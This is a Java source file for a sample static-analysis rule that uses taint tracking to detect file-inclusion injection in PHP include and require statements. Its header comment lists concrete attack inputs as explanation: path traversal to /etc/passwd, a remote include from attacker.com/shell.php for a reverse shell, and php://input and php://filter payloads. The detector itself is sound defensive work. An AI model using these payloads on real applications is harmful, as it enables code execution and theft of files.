/**
 * checKing - Scorecard for software development processes
 * [C] Optimyth Software Technologies, 2009
 * Created by: lrodriguez Date: 4/29/13 6:41 PM
 */

package com.optimyth.qaking.rules.samples.php;

import com.als.core.RuleContext;
import com.als.core.RuleViolation;
import com.als.core.ast.BaseNode;
import com.google.common.collect.ImmutableList;
import com.kiuwan.qaking.php.rules.security.BasePhpTaintingRule;
import com.kiuwan.qaking.php.tainting.checkers.IncludeSinkChecker;
import com.kiuwan.qaking.php.tainting.checkers.Neutralizations;
import com.optimyth.qaking.codeanalysis.metadata.model.Libraries;
import com.optimyth.qaking.codeanalysis.metadata.tainting.NeutralizationDef;
import com.optimyth.qaking.codeanalysis.metadata.tainting.SinkDef;
import com.optimyth.qaking.codeanalysis.tainting.TaintPredicates;
import com.optimyth.qaking.codeanalysis.tainting.TaintingAnalyzer;
import com.optimyth.qaking.codeanalysis.tainting.site.Neutralization;
import com.optimyth.qaking.codeanalysis.tainting.site.NeutralizationChecker;
import com.optimyth.qaking.codeanalysis.tainting.site.SinkChecker;
import com.optimyth.qaking.php.PHPConstants;
import com.optimyth.qaking.php.ast.PhpNode;
import com.optimyth.qaking.php.expression.PhpExpressionEvaluator;
import com.optimyth.qaking.php.rules.ViolationFactory;
import com.optimyth.qaking.php.util.CodeExtractor;

import java.text.MessageFormat;
import java.util.List;
import java.util.function.Predicate;
import java.util.regex.Pattern;

import static com.optimyth.qaking.php.ast.PhpNode.cast;
import static com.optimyth.qaking.php.util.PhpPredicates.INCLUDE;
import static com.optimyth.qaking.php.util.TypeUtil.*;
import static es.als.util.StringUtils.hasText;

/**
 * IncludeFileInjectionRule - Sample rule that checks improper Control of filename for PHP include / require.
 * This sample rules is an example of tainting propagation in PHP.
 * <p/>
 * The PHP application receives input from an upstream component, but it does not restrict or incorrectly restricts the input
 * before its usage in include / include_once / require / require_once, or similar statements.
 * <p/>
 * The attacker may be able to specify arbitrary code to be executed from a remote location, by providing an URL.
 * It could also read PHP source or other local files. Alternatively, it may be possible to use normal program behaviour
 * to insert php code into files on the local machine which can then be included and force the code to execute,
 * since php ignores everything in the file except for the content between php specifiers.
 * <p/>
 * There are many attack avenues for this issue:
 * 1) Basic local file inclusion:
 * <code>include("includes/" . $_GET['file']);</code>
 * By providing <tt>file=.htaccess</tt> or <tt>file=../../var/lib/locate.db</tt>, attacker may see local files,
 * even out of the webapp directory.
 * By providing <tt>file=uploads/my_hacker_upload.php</tt>, the attacker may upload code that will be executed by PHP.
 * <p/>
 * 2) Limited local file inclusion:
 * <code>include("includes/" . $_GET['file'] . ".htm");</code>
 * The attacker may inject null byte and get rid of the appended extension (requires magic_quotes_gpc=on in php.ini)
 * <tt>file=../../../../../../../../../etc/passwd%00</tt>
 * <p/>
 * 3) Basic remote file inclusion:
 * include($_GET['file']);
 * By providing file=http://attacker.com/shell.php, the attacker may inject arbitrary code (e.g. get a reverse shell)
 * (Requires allow_url_fopen=On and allow_url_include=On in php.ini)
 * By providing file=php://input, the attacker could add payload in the POST data (like <?php phpinfo(); ?>), requires allow_url_include=On.
 * By providing file=php://filter/convert.base64-encode/resource=index.php, the attacker could read PHP code in webapp (or binary files...).
 * This is NOT restricted by allow_url_fopen or allow_url_include.
 * <p/>
 * As include statements that could be partially controlled by user input is very dangerous, it is recommended
 * to avoid dependency on any user-controlled input in the included resource, or at least use file neutralization functions
 * like basename() or pathinfo().
 * <p/>
 * NOTE: If the 'avoidUrlIncludes' is set to true, includes from a remote URL are also forbidden, as the remote server
 * could be compromised, and could return malicious code as attack vector against the analyzed software. Although since
 * PHP 5.2 URL includes are deactivated by default, allow_url_include could be enabled in the PHP configuration.
 * <p/>
 * This sample rule similar to standard com.optimyth.qaking.php.rules.security.IncludeFileInjectionRule in php rules jar.
 *
 * @author <a href="mailto:lrodriguez@optimyth.org">lrodriguez</a>
 * @version 29-04-2013
 */
public class IncludeFileInjection extends BasePhpTaintingRule {
  private static final String SINK_KIND = "file_inclusion";
  private static final Pattern URL_PATTERN = Pattern.compile("^https?://|^ftps?://");

  // SinkChecker that match include | include_once | require | require_once as include sinks
  private final SinkChecker sinkChecker = new IncludeSinkChecker(SINK_KIND, "*");

  private boolean avoidUrlIncludes = true;

  @Override public void initialize(RuleContext ctx) {
    super.initialize(ctx);
    // with avoidUrlIncludes=true ANY include containing http:// or ftp:// URLs will be reported as violation,
    // even when argument is not tainted with external input.
    avoidUrlIncludes = getProperty("avoidUrlIncludes", true);
  }

  @Override protected Predicate<SinkDef> getSinkPredicate(Libraries libs, RuleContext ctx) {
    return TaintPredicates.sink(SINK_KIND);
  }

  @Override protected List<SinkChecker> getAdditionalSinkCheckers(Predicate<SinkDef> pred, Libraries libs, RuleContext ctx) {
    return ImmutableList.of(sinkChecker);
  }

  // casting neutralization: either (type) expr or settype(expr), when the type is a primitive one
  @Override protected NeutralizationChecker getNeutralizationChecker(Libraries libs, RuleContext ctx) {
    return Neutralizations.castChecker(
      type ->
        type != null && (isFloat(type) || isInteger(type) || isBool(type)),
      (expr, type) ->
        new Neutralization(expr, new NeutralizationDef(new int[] {0}, null, SINK_KIND, null) )
    );
  }

  // In addition to the normal external-controlled source -> include sink tainting flaws,
  // report (when avoidUrlIncludes=true) the remote includes, when the URL could be evaluated statically
  @Override protected void afterTaintingPropagation(BaseNode root, TaintingAnalyzer analyzer, RuleContext ctx) {
    if (!avoidUrlIncludes) return;
    cast(root).accept(node -> {
      if(INCLUDE.is(node)) {
        PhpNode include = cast(node);
        PhpNode expr = include.child(PHPConstants.Expr);
        // Infer constant expression for include() argument
        String candidate = PhpExpressionEvaluator.withVariableValueEvaluator().evalString(expr);
        if(hasText(candidate) && URL_PATTERN.matcher(candidate).find()) {
          // Report violation passing the URL matched in message
          String explain = MessageFormat.format("Remote include from URL {0}", candidate);
          String code = CodeExtractor.getCode(include, false);
          RuleViolation rv = ViolationFactory.createViolation(this, ctx, include, explain, code);
          ctx.addRuleViolation( rv );
        }
      }
    });
  }
}
